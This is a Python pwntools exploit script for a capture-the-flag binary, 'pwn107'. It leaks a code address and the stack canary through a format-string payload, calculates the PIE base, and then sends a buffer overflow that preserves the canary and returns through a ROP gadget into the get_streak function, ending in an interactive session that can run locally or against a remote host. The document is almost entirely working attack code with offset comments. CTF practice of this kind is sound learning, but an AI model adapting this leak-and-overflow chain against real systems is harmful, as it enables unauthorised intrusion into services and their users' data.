import sys
from struct import *

from pwn import *

context(os="linux", arch="amd64")

elf = ELF("./pwn107.pwn107")
context.binary = binary = elf
static_libc_address = binary.symbols.__libc_csu_init


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([binary.path] + argv, *a, **kw)


io = start()
io.recvuntil(b"streak?")

# input location = %6$p
# libc location = input+4 = %10$p
# canary location = input+7 = %13$p
payload = b""
payload += b"%9$p.%13$p"  # here we leak

io.sendline(payload)

io.recvuntil(b"streak:")

output = io.recv().split(b"\n")[0]

dynamic_libc_address = int(output.split(b".")[0].strip(), 16)
canary = int(output.split(b".")[1].strip(), 16)

dynamic_base_address = dynamic_libc_address - static_libc_address
binary.address = dynamic_base_address

dynamic_get_streak = binary.symbols.get_streak

rop = ROP(binary)
ret_gadget = rop.find_gadget(["ret"])[0]

payload = b""
payload += b"\x90" * 24  # nop 24 byte before touch canary
payload += p64(canary)
payload += b"\x90" * 8  # nop fill to stack
payload += p64(ret_gadget)
payload += p64(dynamic_get_streak)

io.sendline(payload)


io.interactive()
